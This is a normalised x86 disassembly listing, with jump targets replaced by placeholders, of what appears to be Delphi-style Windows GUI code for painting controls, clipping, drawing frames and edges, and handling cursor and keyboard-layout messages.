mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41d5dc
call sub_41c958
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41d618
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43cac0
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_441388
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_439dac
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_43e0d4
mov [ esi + 0xc ] eax
mov bl 0x1
sub_4413bc
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_4414dc
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441514
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4414e3
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413f44
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_441514
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413fa0
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_413f44
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412b10
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413f44
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c958
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412b10
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c958
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412b10
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_43b85c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43e0d4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_441744
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_43b85c
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43e0d4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43e0d4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_43b85c
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_441744
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413f44
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_441898
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4413bc
jmp r-xdata
mov eax ebx
call sub_440438
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4419ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443708
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43e0d4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_441898
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_443708
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_4419f8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441a18
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441a8c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441aac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441acc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441af0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441b14
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441b38
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_441388
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_441b5c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42f548
mov edi eax
mov eax edi
call sub_42f628
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d618
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443708
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42f7c0
jmp r-xdata
sub_441be4
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43ea08
test bl bl
je r-xdata
mov eax edi
call sub_443a18
mov eax edi
call sub_443610
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_443610
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_441ca4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43e664
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_441cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443a18
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43ffc8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403454
sub_441d3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43ca64
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_440ff4
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c6d0
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45abb8
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_441e8c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_441f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441f72
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_443708
mov dl [ ebx + 0x184 ]
call sub_44838c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ab30
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407de0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a930
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a930
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45a930
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_441f78
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_442002
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442009
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ab30
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407de0
test eax eax
je r-xdata
mov eax ebx
call sub_443708
mov dl 0x1
call sub_448370
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_442064
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412b00
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43e0d4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_4420b4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_4420e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403454
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403454
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_442128
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43e0d4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_442180
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419f34
mov edx [ r-xdata ]
call sub_403408
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_4421b8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413f44
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4421dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_443708
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_442238
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_4421a4
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413f44
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_442278
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4056dc
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4056dc
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_4422e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44238c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442393
lea eax [ ebp - 0x4 ]
call sub_4056c4
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43abcc
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403258
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4056c4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403454
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4056dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x178 ] eax
sub_44239c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443708
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor edx edx
push ebp
push sub_44245e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403454
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442465
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_442465
mov eax [ ebp - 0x4 ]
call sub_453eac
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43d180
sub_4424b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4031a0
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ed94
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
